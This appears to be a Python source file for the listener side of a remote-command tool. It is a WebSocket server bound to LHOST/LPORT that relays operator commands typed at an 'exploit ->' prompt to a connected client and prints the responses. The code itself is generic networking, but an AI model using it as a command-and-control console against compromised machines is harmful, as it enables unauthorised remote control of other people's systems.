from settings import LHOST, LPORT
import websockets



async def handle_websocket(websocket, path):

    # This function will handle incoming WebSocket messages.
    try:
        message = await websocket.recv()
        print(f"Received message: {message}")
        while True:
            
            commandInput = input("exploit -> ")
        
            if commandInput == 'exit':
                break
            
            await websocket.send(commandInput)
            print("Message sent: " + commandInput)

            message = await websocket.recv()
            print(f"Received message: {message}")
            
    except websockets.exceptions.ConnectionClosedOK:
        # This exception will be raised when the client disconnects normally.
        print("Client disconnected.")
    except websockets.exceptions.ConnectionClosedError:
        # This exception will be raised when the client disconnects unexpectedly.
        print("Client disconnected unexpectedly.")


async def start_server():
    # Replace '0.0.0.0' with your server's IP address if you want to listen on a specific address.
    # '8765' is the port number on which the server will listen.
    server = await websockets.serve(handle_websocket, LHOST, LPORT)

     # Start a separate task for sending messages
    # asyncio.create_task(send_commands(None, None))
    
    print("WebSocket server started. Listening on ws://{}:{}".format(LHOST,LPORT))

    # This will keep the server running until it is explicitly stopped.
    await server.wait_closed()



 
